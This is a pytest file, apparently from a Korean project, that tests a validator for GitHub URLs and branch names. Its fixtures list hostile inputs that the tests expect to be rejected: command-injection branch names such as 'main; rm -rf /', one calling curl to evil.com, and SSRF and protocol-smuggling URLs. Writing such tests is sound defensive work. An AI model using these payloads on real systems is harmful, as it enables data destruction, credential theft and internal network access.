"""
URL Validator 테스트
"""
import pytest
from app.core.validators import URLValidator


class TestURLValidator:
    """URLValidator 테스트"""

    def test_valid_github_https_url(self):
        """유효한 GitHub HTTPS URL 테스트"""
        valid_urls = [
            "https://github.com/torvalds/linux",
            "https://github.com/facebook/react",
            "https://github.com/microsoft/vscode",
            "https://github.com/user/repo.git",
            "https://github.com/user-name/repo-name",
            "https://github.com/user.name/repo.name",
        ]

        for url in valid_urls:
            is_valid, error_msg = URLValidator.validate_github_url(url)
            assert is_valid, f"URL should be valid: {url}, error: {error_msg}"
            assert error_msg == ""

    def test_invalid_protocol(self):
        """잘못된 프로토콜 테스트"""
        invalid_urls = [
            "http://github.com/user/repo",  # HTTP (not HTTPS)
            "git://github.com/user/repo",  # Git protocol
            "ssh://git@github.com/user/repo",  # SSH
            "file:///etc/passwd",  # File protocol (SSRF)
            "ftp://github.com/user/repo",  # FTP
        ]

        for url in invalid_urls:
            is_valid, error_msg = URLValidator.validate_github_url(url)
            assert not is_valid, f"URL should be invalid: {url}"
            assert "protocol" in error_msg.lower()

    def test_invalid_domain(self):
        """잘못된 도메인 테스트"""
        invalid_urls = [
            "https://gitlab.com/user/repo",
            "https://bitbucket.org/user/repo",
            "https://malicious-site.com/user/repo",
            "https://github.evil.com/user/repo",  # 서브도메인 스푸핑 시도
            "https://127.0.0.1/user/repo",  # SSRF: localhost
            "https://10.0.0.1/user/repo",  # SSRF: private IP
            "https://internal-server/user/repo",  # SSRF: 내부 서버
        ]

        for url in invalid_urls:
            is_valid, error_msg = URLValidator.validate_github_url(url)
            assert not is_valid, f"URL should be invalid: {url}"
            assert "github" in error_msg.lower() or "domain" in error_msg.lower()

    def test_invalid_path_pattern(self):
        """잘못된 경로 패턴 테스트"""
        invalid_urls = [
            "https://github.com/",  # 경로 없음
            "https://github.com/user",  # 레포지토리 이름 없음
            "https://github.com/user/repo/extra",  # 추가 경로
            "https://github.com/user/repo/tree/main",  # 브랜치 경로
            "https://github.com/../../../etc/passwd",  # 디렉토리 탐색
        ]

        for url in invalid_urls:
            is_valid, error_msg = URLValidator.validate_github_url(url)
            assert not is_valid, f"URL should be invalid: {url}"

    def test_url_with_query_or_fragment(self):
        """쿼리 파라미터나 프래그먼트가 있는 URL 테스트"""
        invalid_urls = [
            "https://github.com/user/repo?param=value",
            "https://github.com/user/repo#section",
            "https://github.com/user/repo?a=1&b=2",
        ]

        for url in invalid_urls:
            is_valid, error_msg = URLValidator.validate_github_url(url)
            assert not is_valid, f"URL should be invalid: {url}"

    def test_empty_url(self):
        """빈 URL 테스트"""
        is_valid, error_msg = URLValidator.validate_github_url("")
        assert not is_valid
        assert "required" in error_msg.lower()

    def test_valid_branch_names(self):
        """유효한 브랜치 이름 테스트"""
        valid_branches = [
            "main",
            "master",
            "develop",
            "feature/new-feature",
            "bugfix/fix-123",
            "release/v1.0.0",
            "hotfix-urgent",
            "user_branch",
            "branch.name",
        ]

        for branch in valid_branches:
            is_valid, error_msg = URLValidator.validate_branch_name(branch)
            assert is_valid, f"Branch should be valid: {branch}, error: {error_msg}"

    def test_invalid_branch_names_command_injection(self):
        """Command Injection 시도 브랜치 이름 테스트"""
        dangerous_branches = [
            "main; rm -rf /",  # 세미콜론
            "main | cat /etc/passwd",  # 파이프
            "main && rm -rf /",  # AND 연산자
            "main || cat secret",  # OR 연산자
            "main`cat /etc/passwd`",  # 백틱
            "main$(cat /etc/passwd)",  # 달러 사인
            "../../../etc/passwd",  # 디렉토리 탐색
            "main\\nrm -rf /",  # 백슬래시
        ]

        for branch in dangerous_branches:
            is_valid, error_msg = URLValidator.validate_branch_name(branch)
            assert not is_valid, f"Branch should be invalid: {branch}"

    def test_branch_name_too_long(self):
        """너무 긴 브랜치 이름 테스트"""
        long_branch = "a" * 256
        is_valid, error_msg = URLValidator.validate_branch_name(long_branch)
        assert not is_valid
        assert "long" in error_msg.lower()

    def test_empty_branch_name(self):
        """빈 브랜치 이름 테스트"""
        is_valid, error_msg = URLValidator.validate_branch_name("")
        assert not is_valid
        assert "required" in error_msg.lower()

    def test_sanitize_github_url(self):
        """GitHub URL 정규화 테스트"""
        assert (
            URLValidator.sanitize_github_url("https://github.com/user/repo.git")
            == "https://github.com/user/repo"
        )
        assert (
            URLValidator.sanitize_github_url("https://github.com/user/repo")
            == "https://github.com/user/repo"
        )
        assert (
            URLValidator.sanitize_github_url("  https://github.com/user/repo  ")
            == "https://github.com/user/repo"
        )


class TestSecurityVulnerabilities:
    """보안 취약점 테스트"""

    def test_ssrf_prevention(self):
        """SSRF 공격 방지 테스트"""
        ssrf_attempts = [
            "https://127.0.0.1/user/repo",
            "https://localhost/user/repo",
            "https://10.0.0.1/user/repo",
            "https://192.168.1.1/user/repo",
            "https://169.254.169.254/latest/meta-data",  # AWS metadata
            "https://internal-server/user/repo",
        ]

        for url in ssrf_attempts:
            is_valid, _ = URLValidator.validate_github_url(url)
            assert not is_valid, f"SSRF attempt should be blocked: {url}"

    def test_protocol_smuggling_prevention(self):
        """프로토콜 스머글링 방지 테스트"""
        smuggling_attempts = [
            "file:///etc/passwd",
            "gopher://evil.com",
            "dict://evil.com",
            "php://filter/resource=/etc/passwd",
        ]

        for url in smuggling_attempts:
            is_valid, _ = URLValidator.validate_github_url(url)
            assert not is_valid, f"Protocol smuggling should be blocked: {url}"

    def test_command_injection_prevention(self):
        """Command Injection 방지 테스트"""
        injection_branches = [
            "main; curl http://evil.com",
            "main`whoami`",
            "main$(id)",
            "main && cat /etc/passwd",
        ]

        for branch in injection_branches:
            is_valid, _ = URLValidator.validate_branch_name(branch)
            assert not is_valid, f"Command injection should be blocked: {branch}"
